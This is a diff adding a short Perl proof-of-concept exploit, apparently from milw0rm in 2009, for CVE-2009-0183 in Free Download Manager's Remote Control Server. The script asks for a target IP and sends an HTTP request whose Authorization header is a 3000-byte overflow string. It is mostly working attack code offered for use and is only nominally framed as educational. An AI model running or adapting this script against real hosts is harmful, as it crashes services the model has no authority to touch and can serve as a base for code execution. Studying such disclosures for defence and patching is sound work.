@@ -1,0 +1,46 @@
+#!usr/bin/perl -w
+
+#######################################################################################
+#   Stack-based buffer overflow in Remote Control Server in Free Download Manager
+#    (FDM) 2.5 Build 758 and 3.0 Build 844 allows remote attackers to execute
+#    arbitrary code via a long Authorization header in an HTTP request.
+#    Refer:
+#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0183
+#
+#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with
+#     "#!Installation_path_for_perl -w" (say #!C:/Program Files/Perl/bin/perl -w)
+#
+#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
+#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
+#
+#        Author:    Praveen Darshanam
+#        Email:     praveen[underscore]recker[at]sify.com\
+#        Blog:        http://www.darshanams.blogspot.com/
+#        Date:      04th February, 2009
+#
+########Thanx to str0ke,milw0rm, @rp m@n, and all the security folks####################
+########################################################################################
+
+use IO::Socket;
+
+print("\nEnter IP Address of Remote Control Server(not domain) FDM: \n");
+$vuln_host_ip = <STDIN>;
+
+
+$sock_http = IO::Socket::INET->new(   PeerAddr => $vuln_host_ip,
+                                     PeerPort => 80,
+                                     Proto    => 'tcp') || "Unable to create Socket for HTTP Connection";
+
+$mal_buff="D"x3000;
+
+$http_attack = "GET / HTTP/1.1\r\n".
+"Host: $vuln_host_ip\r\n".
+"Authorization:$mal_buff\r\n".
+"Keep-Alive: 300\r\n".
+"Connection: keep-alive\r\n\r\n";
+
+print $sock_http $http_attack;
+
+close($sock_http);
+
+# milw0rm.com [2009-02-04]
